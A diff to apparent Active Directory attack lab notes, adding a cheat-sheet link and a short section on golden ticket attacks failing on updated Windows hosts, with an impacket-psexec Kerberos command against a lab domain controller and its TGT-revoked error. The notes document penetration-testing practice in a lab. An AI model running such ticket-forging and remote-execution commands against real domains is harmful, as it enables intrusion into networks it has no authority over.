@@ -1,5 +1,7 @@
 # Attacking Active Directory
 
+[Active Directory Cheat Sheet](https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a)
+
 ## Lab Environment
 
 |Server|IP Address|OS|Function|
@@ -943,3 +945,21 @@ Tunnel adapter isatap.{122DB809-79C7-4A57-9A51-76A6C8B0B97B}:
    Media State . . . . . . . . . . . : Media disconnected
    Connection-specific DNS Suffix  . :
 ```
+
+## 5.3. Golden Ticket Fixed?
+
+Access denied and TGT revoked errors were seen when performing golden ticket attacks on newer updated Windows boxes
+
+```console
+┌──(root㉿kali)-[~]
+└─# impacket-psexec lab.vx/nonexistentuser@192.168.17.11 -k -no-pass -dc-ip 192.168.17.11
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[-] Kerberos SessionError: KDC_ERR_TGT_REVOKED(TGT has been revoked)
+```
+
+Read:
+
+<https://github.com/SecureAuthCorp/impacket/issues/1390>
+
+<https://www.varonis.com/blog/pac_requestor-and-golden-ticket-attacks>
